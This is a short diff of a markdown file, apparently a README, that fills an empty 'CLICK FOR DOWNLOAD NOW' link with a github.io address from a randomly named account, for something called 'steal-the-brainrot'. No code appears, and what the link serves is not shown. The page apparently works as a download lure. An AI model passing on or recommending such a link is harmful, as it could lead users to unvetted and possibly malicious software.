@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://MoatDeckhandPlait.github.io/steal-the-brainrot-et28/ ) |
  |---------------------|----------------------:|
 
 
